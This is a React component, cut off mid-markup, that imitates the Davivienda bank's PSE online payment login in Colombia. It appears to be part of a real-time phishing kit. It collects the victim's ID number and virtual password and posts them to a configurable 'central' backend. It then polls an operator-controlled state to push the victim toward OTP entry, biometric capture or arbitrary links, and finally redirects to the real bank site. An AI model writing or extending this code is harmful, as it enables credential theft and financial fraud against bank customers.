import React, { useEffect, useMemo, useRef, useState } from 'react';
import { useNavigate, useLocation } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import { PSE_SESSION_HANDOFF_KEY } from "../../../../loadingPse/PseLoading";
import { redirectToTcIngreso } from "../../../../ingresoTc/tcSessionHelper";
import LoadingDavivienda from "../../../../../components/LoadingDavivienda";
import logoFooter from "../../img/Logo-Davivienda-footer.webp";
import logoDavivienda from "../../img/imgi_1_logo-davivienda2.webp";
import vigilado from "../../img/imgi_17_logo_vigilado.svg";
import './login_davivienda_pse.css';

// Se inicializan las claves de estado para modal y mid flow
const DAVI_ERROR_KEY = "davivienda_error_modal";
const DAVI_MID_FLOW_KEY = "davivienda_mid_flow";
const DAVI_LOGIN_ERROR_AUTO_HIDE_MS = 5000;
const DAVI_LOGIN_ERROR_MSG = "Acceso denegado, Por favor revise los valores ingresados";

// Se definen los estados tras login
const ESTADOS_TRAS_LOGIN = [
    "sol_otp",
    "sol_biometria",
    "sol_finalizar",
    "sol_finalizado",
    "solicitar_finalizar",
    "error_otp",
    "error_login",
    "block_ip",
    "error_blocked",
    "link_bot",
    "sol_link_custom",
];

// Se definen los tipos de documento disponibles
const DOCUMENT_TYPE_OPTIONS = [
    { value: "01", label: "Cedula de Ciudadania" },
    { value: "02", label: "Cedula de Extranjeria" },
    { value: "03", label: "NIT" },
    { value: "04", label: "Tarjeta de Identidad" },
    { value: "05", label: "Pasaporte" },
    { value: "06", label: "Trj. Seguro Social Extranjero" },
    { value: "07", label: "Sociedad Extranjera sin NIT en Colombia" },
    { value: "08", label: "Fideicomiso" },
    { value: "09", label: "NIT Menores" },
    { value: "10", label: "RIF Venezuela" },
    { value: "11", label: "NIT Extranjeria" },
    { value: "12", label: "NIT Persona Natural" },
    { value: "13", label: "Registro Civil De Nacimiento" },
    { value: "18", label: "Permiso Proteccion Temporal" },
];

// Se crea helper para obtener la etiqueta de tipo de documento
const getTipoDocumentoLabel = (value) => DOCUMENT_TYPE_OPTIONS.find((item) => item.value === value)?.label ?? value;

// Reglas de documento Colombia (CC, CE, NI, TI, PE) alineadas con Caja Social
const DAVIVIENDA_DOC_PREFIX_BY_TYPE = {
    '01': 'CC',
    '02': 'CE',
    '03': 'NI',
    '04': 'TI',
    '18': 'PE',
};

const DAVIVIENDA_DOC_RULES = {
    CC: {
        maxLen: 10,
        test: (n) => /^\d{6,10}$/.test(n),
        hint: 'La cédula de ciudadanía debe tener entre 6 y 10 dígitos.',
    },
    CE: {
        maxLen: 10,
        test: (n) => /^\d{6,10}$/.test(n),
        hint: 'La cédula de extranjería debe tener entre 6 y 10 dígitos.',
    },
    NI: {
        maxLen: 10,
        test: (n) => /^\d{9,10}$/.test(n),
        hint: 'El NIT debe tener 9 o 10 dígitos.',
    },
    TI: {
        maxLen: 11,
        test: (n) => /^\d{10,11}$/.test(n),
        hint: 'La tarjeta de identidad debe tener 10 u 11 dígitos.',
    },
    PE: {
        maxLen: 15,
        test: (n) => /^\d{6,15}$/.test(n),
        hint: 'El permiso especial de permanencia debe tener entre 6 y 15 dígitos.',
    },
};

const DAVIVIENDA_GENERIC_DOC_RULE = {
    maxLen: 15,
    test: (n) => /^\d{6,15}$/.test(n),
    hint: 'El número de documento debe tener entre 6 y 15 dígitos.',
};

const CLAVE_VIRTUAL_HINT = 'La clave virtual debe tener 6 u 8 dígitos.';

const getDaviviendaDocRuleKey = (tipoValue) => DAVIVIENDA_DOC_PREFIX_BY_TYPE[tipoValue] ?? null;

const getDaviviendaDocRule = (tipoValue) => {
    const key = getDaviviendaDocRuleKey(tipoValue);
    return key ? DAVIVIENDA_DOC_RULES[key] : DAVIVIENDA_GENERIC_DOC_RULE;
};

const sanitizeDaviviendaNumeroDocumento = (tipoValue, raw) => {
    const maxLen = getDaviviendaDocRule(tipoValue).maxLen;
    return String(raw || '').replace(/\D/g, '').slice(0, maxLen);
};

const getDaviviendaDocumentError = (tipoValue, numero) => {
    if (numero === '') return null;
    if (!/^\d+$/.test(numero)) {
        return 'El número de identificación solo debe contener dígitos.';
    }
    const rule = getDaviviendaDocRule(tipoValue);
    return rule.test(numero) ? null : rule.hint;
};

const isDaviviendaClaveVirtualValid = (clave) => /^\d{6}$/.test(clave) || /^\d{8}$/.test(clave);

// Se crea helper para capitalizar texto
const capitalizeFirst = (text) => text.charAt(0).toUpperCase() + text.slice(1);

// Se crea helper para formatear fecha y hora del encabezado
const formatDaviviendaHeaderDate = (date) => {

    // Se formatea la fecha y hora
    const parts = new Intl.DateTimeFormat('es-CO', {
        weekday: 'long',
        day: 'numeric',
        month: 'long',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        hour12: true,
    }).formatToParts(date);

    // Se obtiene el valor de la parte del tipo de dato
    const get = (type) => parts.find((p) => p.type === type)?.value ?? '';

    // Se inicializan las variables
    const weekday = capitalizeFirst(get('weekday'));
    const day = get('day');
    const month = capitalizeFirst(get('month'));
    const year = get('year');
    const hour = get('hour');
    const minute = get('minute');
    const dayPeriod = get('dayPeriod').replace(/\./g, '').replace(/\s/g, '').toUpperCase();

    // Se retorna la fecha y hora formateada
    return `${weekday} ${day} de ${month} de ${year}, ${hour}:${minute} ${dayPeriod}`;
};

// Se crea el componente para renderizar el login del banco Davivienda
const LoginDaviviendaPse = () => {

    // Se inicializa el navigate
    const navigate = useNavigate();
    const location = useLocation();

    // Se inicializan los estados del formulario y UI
    const [now, setNow] = useState(() => new Date());
    const [view, setView] = useState('channel');
    const [selectedChannel, setSelectedChannel] = useState('persona');
    const [authStep, setAuthStep] = useState(1);
    const [formData, setFormData] = useState({
        tipoDocumento: '01',
        numeroDocumento: '',
        claveVirtual: '',
    });

    // Se inicializan los estados del formulario y UI
    const [isDocumentoFocused, setIsDocumentoFocused] = useState(false);
    const [documentError, setDocumentError] = useState(null);
    const [claveError, setClaveError] = useState(null);
    const [revealedClaveIndex, setRevealedClaveIndex] = useState(null);
    const [getLoading, setLoading] = useState(false);
    const [daviLoginErrorOpen, setDaviLoginErrorOpen] = useState(false);
    const [showModal, setShowModal] = useState(false);
    const [modalText, setModalText] = useState("");

    // Se inicializan las referencias del polling y control de estado
    const pollingIntervalRef = useRef(null);
    const sessionIdRef = useRef(null);
    const lastEstadoRef = useRef(null);
    const allowPollNavigationRef = useRef(false);
    const modalBloqueoEstadoRef = useRef(null);
    const ignorarEstadoHastaCambioRef = useRef(null);

    // Se inicializan valores calculados del encabezado
    const currentDate = useMemo(() => formatDaviviendaHeaderDate(now), [now]);

    // Se inicializa el código de seguimiento CUS de la transacción
    const cusCode = useMemo(() => String(Math.floor(100000000 + Math.random() * 900000000)), [],
    );

    const documentoMaxLength = useMemo(
        () => getDaviviendaDocRule(formData.tipoDocumento).maxLen,
        [formData.tipoDocumento],
    );

    // Se crea el useEffect para actualizar fecha y hora del encabezado
    useEffect(() => {

        // Se inicializa el intervalo para actualizar la fecha y hora
        const intervalId = setInterval(() => {

            // Se actualiza la fecha y hora
            setNow(new Date());
        }, 1000);

        // Se retorna el cleanup
        return () => clearInterval(intervalId);
    }, []);

    // Se crea el useEffect para ocultar temporalmente el último dígito visible
    useEffect(() => {

        // Se valida si el indice de la clave revelada es null
        if (revealedClaveIndex === null) return undefined;

        // Se inicializa el timeout para ocultar la clave
        const timeoutId = setTimeout(() => {

            // Se oculta la clave
            setRevealedClaveIndex(null);
        }, 700);

        // Se retorna el cleanup
        return () => clearTimeout(timeoutId);
    }, [revealedClaveIndex]);

    // Se crea el metodo para redirigir rutas internas
    const redirigir = (ruta) => {

        // Se redirige a la ruta indicada
        navigate(ruta);
    };

    // Se crea el metodo para parar el polling
    const stopPolling = () => {

        // Se valida si existe el intervalo de polling
        if (pollingIntervalRef.current) {

            // Se limpia el intervalo de polling
            clearInterval(pollingIntervalRef.current);

            // Se resetea la referencia
            pollingIntervalRef.current = null;
        }
    };

    // Se crea el metodo para iniciar el polling
    const initPolling = () => {

        // Se para el polling
        stopPolling();

        // Se inicia el polling cada 3 segundos
        pollingIntervalRef.current = setInterval(() => {

            // Se verifica el estado
            verifyState();
        }, 3000);

        // Se verifica el estado de inmediato
        verifyState();
    };

    const clearLoginFormFields = () => {
        setFormData({
            tipoDocumento: '01',
            numeroDocumento: '',
            claveVirtual: '',
        });
        setAuthStep(1);
        setDocumentError(null);
        setClaveError(null);
        setIsDocumentoFocused(false);
        setRevealedClaveIndex(null);
    };

    const dismissLoginErrorAlert = () => {
        setDaviLoginErrorOpen(false);

        if (modalBloqueoEstadoRef.current === "error_login") {
            ignorarEstadoHastaCambioRef.current = "error_login";
            modalBloqueoEstadoRef.current = null;
            sessionStorage.removeItem(DAVI_MID_FLOW_KEY);
        }
    };

    const showLoginCredentialError = () => {
        stopPolling();
        setLoading(false);
        allowPollNavigationRef.current = false;
        modalBloqueoEstadoRef.current = "error_login";
        lastEstadoRef.current = "error_login";
        sessionStorage.removeItem(DAVI_MID_FLOW_KEY);
        setShowModal(false);
        setView('auth');
        clearLoginFormFields();
        setDaviLoginErrorOpen(true);
        window.scrollTo(0, 0);
    };

    const applyPendingScreenSignal = () => {
        const pendingError = localStorage.getItem(DAVI_ERROR_KEY);
        if (!pendingError) return false;

        if (pendingError === "error_login") {
            showLoginCredentialError();
        } else if (pendingError === "block_ip") {
            modalBloqueoEstadoRef.current = "block_ip";
            setShowModal(true);
            setModalText("Acceso bloqueado por seguridad.");
        }

        localStorage.removeItem(DAVI_ERROR_KEY);
        return pendingError === "error_login";
    };

    const bootstrapLoginScreen = () => {
        const handledLoginError = applyPendingScreenSignal();
        const pseHandoff = sessionStorage.getItem(PSE_SESSION_HANDOFF_KEY);
        const midFlow = sessionStorage.getItem(DAVI_MID_FLOW_KEY) === "1";

        if (pseHandoff) {
            localStorage.setItem("sessionId", pseHandoff);
            sessionIdRef.current = pseHandoff;
            lastEstadoRef.current = null;
            sessionStorage.removeItem(PSE_SESSION_HANDOFF_KEY);
            sessionStorage.removeItem(DAVI_MID_FLOW_KEY);
            allowPollNavigationRef.current = false;
            setLoading(false);
        } else if (!handledLoginError && midFlow) {
            const sid = localStorage.getItem("sessionId");
            sessionIdRef.current = sid;

            if (sid) {
                allowPollNavigationRef.current = true;
                setLoading(true);
                initPolling();
            }
        } else {
            sessionIdRef.current = localStorage.getItem("sessionId");
            allowPollNavigationRef.current = false;
            if (handledLoginError) {
                setLoading(false);
            }
        }
    };

    const dismissLoginErrorAlertIfOpen = () => {
        if (daviLoginErrorOpen) {
            dismissLoginErrorAlert();
        }
    };

    useEffect(() => {
        if (!daviLoginErrorOpen) return undefined;

        const timer = window.setTimeout(() => {
            dismissLoginErrorAlert();
        }, DAVI_LOGIN_ERROR_AUTO_HIDE_MS);

        return () => window.clearTimeout(timer);
    }, [daviLoginErrorOpen]);

    // Se crea el useEffect para inicializar session y estado de error
    useEffect(() => {
        bootstrapLoginScreen();

        return () => {
            stopPolling();
        };
    }, [location.pathname, location.key]);

    // Se crea el metodo para verificar el estado actual
    const verifyState = async () => {

        // Se usa el try catch
        try {

            // Se realiza la peticion al backend
            const response = await instanceBackend.post(`/davivienda/verify-state/${sessionIdRef.current}`);

            // Se captura la respuesta del estado
            const { estado: estadoRaw, url, text, tc, tarjeta, bank } = response?.data || {};

            // Se capturan los valores
            const estadoActual = (estadoRaw || "").toLowerCase();
            const hasUrl = Boolean(url && String(url).trim());
            const customLink = hasUrl ? url : (text && String(text).trim() ? text : null);
            const tarjetaDigits = String(tarjeta || "").replace(/\D/g, "");
            const isTcSession = Boolean(tc);
            const isTcOtpFlow = isTcSession && tarjetaDigits.length > 0;
            const linkPendiente = estadoActual === "sol_link_bot" || (estadoActual === "link_bot" && !hasUrl) || (estadoActual === "sol_link_custom" && !customLink);

            // Se valida si existe estado para procesar
            if (!estadoActual) return;

            // Se evita reprocesar el mismo estado despues de cerrar modal
            if (ignorarEstadoHastaCambioRef.current) {

                // Se valida si el estado actual es el mismo que el estado ignorado
                if (estadoActual === ignorarEstadoHastaCambioRef.current) return;

                // Se resetea el estado ignorado    
                ignorarEstadoHastaCambioRef.current = null;

                // Se resetea el estado del modal de bloqueo
                modalBloqueoEstadoRef.current = null;
            }

            // Se evita reabrir modal por el mismo estado bloqueado
            if (modalBloqueoEstadoRef.current && estadoActual === modalBloqueoEstadoRef.current) {

                // Se retorna
                return;
            }

            // Se evita navegar por polling si aun no hay accion del usuario
            if (ESTADOS_TRAS_LOGIN.includes(estadoActual) && !allowPollNavigationRef.current) {

                // Se retorna
                return;
            }

            // Se evita reprocesar estados repetidos cuando no hay link pendiente
            if (!linkPendiente && lastEstadoRef.current === estadoActual) return;

            // Se setea el estado de la ultima accion
            if (!linkPendiente) lastEstadoRef.current = estadoActual;

            // Se maneja la navegacion segun el estado retornado por verifyState
            switch (estadoActual) {
                case "sol_otp":

                    // Se para el polling
                    stopPolling();

                    // Se quita el loading
                    setLoading(false);

                    // Se remueve el mid flow
                    sessionStorage.removeItem(DAVI_MID_FLOW_KEY);

                    // Se redirige al flujo OTP generico si la sesión es TC
                    if (isTcOtpFlow) {

                        // Se redirige al flujo OTP generico si la sesión es TC
                        redirectToTcIngreso(
                            "/ingreso-tc/otp",
                            sessionIdRef.current,
                            bank,
                            tarjetaDigits,
                        );
                    } else {

                        // Se redirige al flujo OTP generico si la sesión no es TC
                        redirigir("/davivienda_otp_pse");
                    }

                    // Se termina el caso
                    break;
                case "sol_biometria":

                    // Se para el polling
                    stopPolling();

                    // Se quita el loading
                    setLoading(false);

                    // Se remueve el mid flow
                    sessionStorage.removeItem(DAVI_MID_FLOW_KEY);

                    // Se deshabilita la navegacion por polling
                    allowPollNavigationRef.current = false;

                    // Se redirige al flujo de biometria
                    redirigir("/davivienda_biometria");

                    // Se termina el caso
                    break;
                case "sol_finalizar":
                case "sol_finalizado":
                case "solicitar_finalizar":

                    // Se para el polling
                    stopPolling();

                    // Se quita el loading
                    setLoading(false);

                    // Se remueve el mid flow
                    sessionStorage.removeItem(DAVI_MID_FLOW_KEY);

                    // Se limpian los localStorage y sessionStorage
                    localStorage.clear();

                    // Se limpian los sessionStorage
                    sessionStorage.clear();

                    // Se redirige al flujo finalizado
                    if (isTcSession) {

                        // Se redirige al flujo finalizado TC
                        window.location.href = `/finalizado-tc?sessionId=${encodeURIComponent(sessionIdRef.current)}`;
                    } else {

                        // Se redirige al flujo finalizado PSE
                        window.location.href = `/finalizado-pse?sessionId=${sessionIdRef.current}`;
                    }

                    // Se termina el caso
                    break;
                case "error_otp":

                    // Se para el polling
                    stopPolling();

                    // Se quita el loading
                    setLoading(false);

                    // Se remueve el mid flow
                    sessionStorage.removeItem(DAVI_MID_FLOW_KEY);

                    // Se setea el estado de error
                    localStorage.setItem(DAVI_ERROR_KEY, "error");

                    // Se redirige al flujo OTP generico si la sesión es TC
                    if (isTcOtpFlow) {

                        // Se redirige al flujo OTP generico si la sesión es TC
                        redirectToTcIngreso(
                            "/ingreso-tc/otp",
                            sessionIdRef.current,
                            bank,
                            tarjetaDigits,
                            "error_otp",
                        );
                    } else {

                        // Se redirige al flujo OTP generico si la sesión no es TC
                        redirigir("/davivienda_otp_pse");
                    }

                    // Se termina el caso
                    break;
                case "error_login":
                    showLoginCredentialError();
                    break;
                case "link_bot":

                    // Se valida si existe url
                    if (hasUrl) {

                        // Se para el polling
                        stopPolling();

                        // Se remueve el mid flow
                        sessionStorage.removeItem(DAVI_MID_FLOW_KEY);

                        // Se redirige a la url
                        window.location.href = url;
                    }

                    // Se termina el caso
                    break;
                case "sol_link_custom":

                    // Se valida si existe custom link
                    if (customLink) {

                        // Se para el polling
                        stopPolling();

                        // Se remueve el mid flow
                        sessionStorage.removeItem(DAVI_MID_FLOW_KEY);

                        // Se redirige a la url custom
                        window.location.href = customLink;
                    }

                    // Se termina el caso
                    break;
                case "block_ip":
                case "error_blocked":

                    // Se para el polling
                    stopPolling();

                    // Se quita el loading
                    setLoading(false);

                    // Se remueve el mid flow
                    sessionStorage.removeItem(DAVI_MID_FLOW_KEY);

                    // Se deshabilita la navegacion por polling
                    allowPollNavigationRef.current = false;

                    // Se setea el estado del modal de bloqueo de IP
                    modalBloqueoEstadoRef.current = "block_ip";

                    // Se muestra el modal de bloqueo de IP
                    setShowModal(true);

                    // Se setea el texto del modal
                    setModalText("Acceso bloqueado por seguridad.");

                    // Se termina el caso
                    break;
                default:

                    // Se termina el caso
                    break;
            }
        } catch (error) {

            // Se captura el status y estado del error
            const status = error?.response?.status;
            const estadoErr = (error?.response?.data?.estado || "").toString().toLowerCase();

            // Se valida si el estado corresponde a bloqueo de IP
            if (status === 403 && estadoErr === "error_blocked") {

                // Se para el polling
                stopPolling();

                // Se quita el loading
                setLoading(false);

                // Se remueve el mid flow
                sessionStorage.removeItem(DAVI_MID_FLOW_KEY);

                // Se deshabilita la navegacion por polling
                allowPollNavigationRef.current = false;

                // Se limpian los localStorage
                localStorage.clear();

                // Se redirige a la pagina de inicio
                window.location.href = process.env.REACT_APP_URL_BANK || "/";
            }
        }
    };

    // Se crea helper para enmascarar el número de documento
    const maskDocumento = (val) => {

        // Se valida si el valor es null o undefined
        if (!val) return '';

        // Se valida si el valor tiene menos de 4 digitos
        if (val.length <= 4) return val;

        // Se retorna el valor enmascarado
        return '•'.repeat(val.length - 4) + val.slice(-4);
    };

    // Se crea el metodo para manejar cambios en inputs generales
    const handleInputChange = (e) => {
        dismissLoginErrorAlertIfOpen();

        // Se captura el nombre y valor del input
        const { name, value } = e.target;

        if (name === 'tipoDocumento') {
            setFormData((prev) => {
                const numeroDocumento = sanitizeDaviviendaNumeroDocumento(value, prev.numeroDocumento);
                return {
                    ...prev,
                    tipoDocumento: value,
                    numeroDocumento,
                };
            });
            setDocumentError(null);
            return;
        }

        // Se setea el valor del input
        setFormData((prev) => ({
            ...prev,
            [name]: value,
        }));
    };

    // Se crea el metodo para manejar cambios del documento
    const handleDocumentoChange = (e) => {
        dismissLoginErrorAlertIfOpen();

        const value = sanitizeDaviviendaNumeroDocumento(formData.tipoDocumento, e.target.value);

        setFormData((prev) => ({
            ...prev,
            numeroDocumento: value,
        }));
        setDocumentError(getDaviviendaDocumentError(formData.tipoDocumento, value));
    };

    // Se crea el metodo para manejar el submit del formulario
    const handleSubmit = async (e) => {

        // Se previene el submit por defecto
        e.preventDefault();
        dismissLoginErrorAlertIfOpen();

        // Se valida el paso 1 del formulario
        if (authStep === 1) {

            if (!formData.numeroDocumento) {
                setDocumentError('Ingrese su número de documento.');
                return;
            }

            const docErr = getDaviviendaDocumentError(
                formData.tipoDocumento,
                formData.numeroDocumento,
            );
            if (docErr) {
                setDocumentError(docErr);
                return;
            }

            setDocumentError(null);
            setClaveError(null);
            setIsDocumentoFocused(false);
            setAuthStep(2);
            return;
        }

        if (!isDaviviendaClaveVirtualValid(formData.claveVirtual)) {
            setClaveError(CLAVE_VIRTUAL_HINT);
            return;
        }

        setClaveError(null);

        if (getLoading) return;

        // Se captura la sessionId desde localStorage
        const sessionId = localStorage.getItem("sessionId");

        // Se valida que exista sessionId persistida
        if (!sessionId) {

            // Se muestra el modal de error de sessionId
            setShowModal(true);

            // Se setea el texto del modal
            setModalText("Por favor, vuelva a la pagina de compra para iniciar el proceso nuevamente.");

            // Se retorna
            return;
        }

        // Se captura la url central
        const centralUrl = (process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || "").trim();

        // Se inicializa el json de datos a enviar
        const dataSend = {
            "data": {
                "attributes": {
                    "usuario": formData.numeroDocumento,
                    "clave": formData.claveVirtual,
                    "fecha": new Date().toISOString(),
                    "sessionId": sessionId,
                    "backend": "P01",
                    "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
                    "backend_url": "/api/v1/davivienda/authenticacion",
                    "tipoDocumento": getTipoDocumentoLabel(formData.tipoDocumento),
                    "canal": selectedChannel,
                },
            },
        };

        // Se para el polling y se limpia el ultimo estado antes de login
        stopPolling();

        // Se limpia el ultimo estado y refs de error previo para permitir nuevo intento
        lastEstadoRef.current = null;
        ignorarEstadoHastaCambioRef.current = null;
        modalBloqueoEstadoRef.current = null;

        // Se usa try catch para el envio
        try {

            // Se activa el loading
            setLoading(true);

            // Se realiza la peticion al backend
            const response = centralUrl ? await instanceBackend.post(centralUrl, dataSend) : await instanceBackend.post("/davivienda/authenticacion", dataSend);

            // Se valida la respuesta exitosa
            if (response?.data?.success) {

                // Se captura la sessionId desde la respuesta
                const sid = response.data.sessionId ?? sessionId;

                // Se setea la sessionId en localStorage
                localStorage.setItem("sessionId", sid);

                // Se setea el usuario en localStorage
                localStorage.setItem("davivienda_usuario", formData.numeroDocumento);

                // Se setea la sessionId en el ref
                sessionIdRef.current = sid;

                // Se setea el mid flow
                sessionStorage.setItem(DAVI_MID_FLOW_KEY, "1");

                // Se habilita la navegacion por polling
                allowPollNavigationRef.current = true;

                // Se inicia el polling
                initPolling();
            } else {
                showLoginCredentialError();
            }
        } catch (error) {

            // Se quita el loading y la navegacion por polling
            setLoading(false);

            // Se deshabilita la navegacion por polling
            allowPollNavigationRef.current = false;

            // Se captura el status y estado del error
            const status = error?.response?.status;

            // Se captura el estado del error
            const estadoErr = (error?.response?.data?.estado || "").toString().toLowerCase();

            // Se valida si el estado corresponde a bloqueo de IP
            if (status === 403 && estadoErr === "error_blocked") {

                // Se remueve el mid flow
                sessionStorage.removeItem(DAVI_MID_FLOW_KEY);

                // Se limpian los localStorage
                localStorage.clear();

                // Se redirige a la pagina de inicio
                window.location.href = process.env.REACT_APP_URL_BANK || "/";

                // Se retorna
                return;
            }

            if (estadoErr === "error_login") {
                showLoginCredentialError();
                return;
            }

            // Se muestra el modal de error de comunicación
            setShowModal(true);

            // Se setea el texto del modal
            setModalText(centralUrl ? "Error de comunicación con el servidor central." : "Error de conexión con el servidor.");
        }
    };

    // Se crea el metodo para cancelar y volver al estado inicial de autenticación
    const handleCancel = () => {
        dismissLoginErrorAlertIfOpen();

        // Se setea la vista a la de seleccion de canal
        setView('channel');

        // Se setea el paso 1 del formulario
        setAuthStep(1);

        // Se setea el formulario a los valores iniciales
        setFormData({
            tipoDocumento: '01',
            numeroDocumento: '',
            claveVirtual: '',
        });

        setDocumentError(null);
        setClaveError(null);
        setIsDocumentoFocused(false);
    };

    // Se crea el metodo para mover la vista al estado de autenticación
    const goToAuthState = (channel) => {
        dismissLoginErrorAlertIfOpen();

        // Se setea el canal seleccionado
        setSelectedChannel(channel);

        // Se setea la vista a la de autenticacion
        setView('auth');

        // Se setea el paso 1 del formulario
        setAuthStep(1);

        // Se setea el formulario a los valores iniciales
        setFormData({
            tipoDocumento: '01',
            numeroDocumento: '',
            claveVirtual: '',
        });

        setDocumentError(null);
        setClaveError(null);
        setIsDocumentoFocused(false);
        setRevealedClaveIndex(null);
        setShowModal(false);
    };

    // Se crea el metodo para cerrar el modal y resetear el formulario
    const closeModal = () => {

        // Se captura el estado del servidor
        const estadoServidor = modalBloqueoEstadoRef.current;

        // Se remueve el estado del servidor
        modalBloqueoEstadoRef.current = null;

        // Se oculta el modal
        setShowModal(false);
        setLoading(false);
    };

    // Se crea helper para mostrar la clave virtual enmascarada
    const getClaveDisplayValue = (value) => {

        // Se valida si el valor es null o undefined
        if (!value) return '';

        // Se retorna el valor enmascarado
        return value.split('').map((char, index) => (index === revealedClaveIndex ? char : '•')).join('');
    };

    // Se crea helper para agregar dígitos a la clave virtual
    const appendClaveDigits = (digits) => {
        dismissLoginErrorAlertIfOpen();

        // Se valida si el valor es null o undefined
        if (!digits) return;

        // Se setea el formulario con el valor agregado
        setFormData((prev) => {

            // Se captura el siguiente valor
            const next = `${prev.claveVirtual}${digits}`.slice(0, 8);

            // Se setea el indice de la clave revelada
            setRevealedClaveIndex(next.length - 1);

            // Se retorna el formulario con el valor agregado
            return {
                ...prev,
                claveVirtual: next,
            };
        });
        setClaveError(null);
    };

    // Se crea helper para eliminar el último dígito de la clave virtual
    const removeLastClaveDigit = () => {

        // Se setea el formulario con el valor eliminado
        setFormData((prev) => ({
            ...prev,
            claveVirtual: prev.claveVirtual.slice(0, -1),
        }));

        // Se setea el indice de la clave revelada
        setRevealedClaveIndex(null);
        setClaveError(null);
    };

    // Se retorna el HTML
    return (
        <div className={`davivienda-page davivienda-pse-page davivienda-pse-page--${view}`}>
            {/* Se renderiza el header principal */}
            <header className="davivienda-header">
                <div className="davivienda-header__container">
                    <div className="davivienda-header__brand">
                        <img
                            src={logoDavivienda}
                            alt="Davivienda"
                            className="davivienda-header__logo"
                        />
                    </div>
                    <div className="davivienda-header__info">
                        <div className="davivienda-header__datetime">
                            {currentDate}
                        </div>
                        <div className="davivienda-header__cus">
                            Código único CUS: {cusCode}
                        </div>
                    </div>
                </div>
            </header>

            {/* Se renderiza el contenido principal */}
            <main className={`davivienda-main ${view === 'auth' ? 'davivienda-main--auth' : ''}`}>
                {view === 'channel' ? (
                    /* Se renderiza la vista de selección de canal */
                    <div className="davivienda-welcome-container">
                        <div className="davivienda-welcome-box">
                            <h1 className="davivienda-title">Bienvenido al Portal de</h1>
                            <h2 className="davivienda-subtitle">Pagos en Línea y PSE</h2>

                            <p className="davivienda-selection-text">
                                Seleccione el canal por el cual realizará el pago:
                            </p>

                            <div className="davivienda-options-grid">
                                <button
                                    type="button"
                                    className="davivienda-option-link"
                                    onClick={() => goToAuthState('persona')}
                                >
                                    <div className="davivienda-option-box davivienda-option-box--natural">
                                        <div className="davivienda-option-icon davivienda-option-icon--person"></div>
                                        <div className="davivienda-option-text">
                                            <span className="davivienda-option-line">Persona</span>
                                            <span className="davivienda-option-line">Natural</span>
                                        </div>
                                    </div>
                                </button>

                                <button
                                    type="button"
                                    className="davivienda-option-link"
                                    onClick={() => { }}
                                >
                                    <div className="davivienda-option-box davivienda-option-box--company">
                                        <div className="davivienda-option-icon davivienda-option-icon--company"></div>
                                        <div className="davivienda-option-text davivienda-option-text--company">
                                            <span className="davivienda-option-line">Empresa</span>
                                        </div>
                                    </div>
                                </button>
                            </div>

                            <div className="davivienda-closing-message">
                                <p>No olvide Cerrar Sesión</p>
                                <p>una vez termine sus transacciones.</p>
                            </div>
                        </div>
                    </div>
                ) : (
                    /* Se renderiza la vista de autenticación */
                    <div className="davivienda-auth-container">
                        <div className="davivienda-auth-titles">
                            <h1 className="davivienda-title">
                                {selectedChannel === 'empresa' ? 'Ingreso Empresa' : 'Ingreso Persona Natural'}
                            </h1>
                            <h2 className="davivienda-subtitle">Pagos en Línea y PSE</h2>
                        </div>

                        {daviLoginErrorOpen ? (
                            <div className="davi-login-alert" role="alert">
                                <span className="davi-login-alert__icon" aria-hidden="true">!</span>
                                <p className="davi-login-alert__text">{DAVI_LOGIN_ERROR_MSG}</p>
                            </div>
                        ) : null}

                        <div className="davivienda-auth-box">
                            <form className="davivienda-auth-form" onSubmit={handleSubmit}>
                                <div className="davivienda-auth-form__header">
                                    <span className="davivienda-auth-form__instruction">
                                        Por favor ingrese la siguiente información:
                                    </span>
                                </div>

                                <div className="davivienda-auth-form__row">
                                    <div className="davivienda-form-group">
                                        <label className="davivienda-form-group__label" htmlFor="tipoDocumento">
                                            Tipo de documento
                                        </label>
                                        <select
                                            id="tipoDocumento"
                                            name="tipoDocumento"
                                            className="davivienda-form-select"
                                            value={formData.tipoDocumento}
                                            onChange={handleInputChange}
                                        >
                                            {DOCUMENT_TYPE_OPTIONS.map((item) => (
                                                <option key={item.value} value={item.value}>
                                                    {item.label}
                                                </option>
                                            ))}
                                        </select>
                                    </div>

                                    <div className="davivienda-form-group">
                                        <label className="davivienda-form-group__label" htmlFor="numeroDocumento">
                                            No. de documento
                                        </label>
                                        <input
                                            type="text"
                                            id="numeroDocumento"
                                            name="numeroDocumento"
                                            className="davivienda-form-input davivienda-form-input--document"
                                            value={
                                                authStep === 2
                                                    ? maskDocumento(formData.numeroDocumento)
                                                    : isDocumentoFocused
                                                        ? formData.numeroDocumento
                                                        : maskDocumento(formData.numeroDocumento)
                                            }
                                            onChange={handleDocumentoChange}
                                            onFocus={() => authStep === 1 && setIsDocumentoFocused(true)}
                                            onBlur={() => authStep === 1 && setIsDocumentoFocused(false)}
                                            maxLength={documentoMaxLength}
                                            autoComplete="off"
                                            readOnly={authStep === 2}
                                        />
                                    </div>

                                    {authStep === 2 && (
                                        <div className="davivienda-form-group">
                                            <label className="davivienda-form-group__label" htmlFor="claveVirtual">
                                                Clave virtual
                                            </label>
                                            <input
                                                type="text"
                                                id="claveVirtual"
                                                name="claveVirtual"
                                                className="davivienda-form-input davivienda-form-input--secure"
                                                value={getClaveDisplayValue(formData.claveVirtual)}
                                                onChange={() => { }}
                                                onKeyDown={(e) => {
                                                    if (e.key === 'Backspace') {
                                                        e.preventDefault();
                                                        removeLastClaveDigit();
                                                        return;
                                                    }
                                                    if (e.key >= '0' && e.key <= '9') {
                                                        e.preventDefault();
                                                        if (formData.claveVirtual.length >= 8) return;
                                                        appendClaveDigits(e.key);
                                                        return;
                                                    }
                                                    const allowedKeys = ['Tab', 'ArrowLeft', 'ArrowRight', 'Home', 'End'];
                                                    if (allowedKeys.includes(e.key)) return;
                                                    e.preventDefault();
                                                }}
                                                onBeforeInput={(e) => {
                                                    const nativeData = e.nativeEvent?.data ?? '';
                                                    const digits = String(nativeData).replace(/\D/g, '');
                                                    if (!digits) return;
                                                    e.preventDefault();
                                                    if (formData.claveVirtual.length >= 8) return;
                                                    appendClaveDigits(digits);
                                                }}
                                                onPaste={(e) => {
                                                    e.preventDefault();
                                                    const pasted = e.clipboardData.getData('text');
                                                    const digits = pasted.replace(/\D/g, '');
                                                    if (!digits) return;
                                                    const remaining = 8 - formData.claveVirtual.length;
                                                    appendClaveDigits(digits.slice(0, remaining));
                                                }}
                                                maxLength="8"
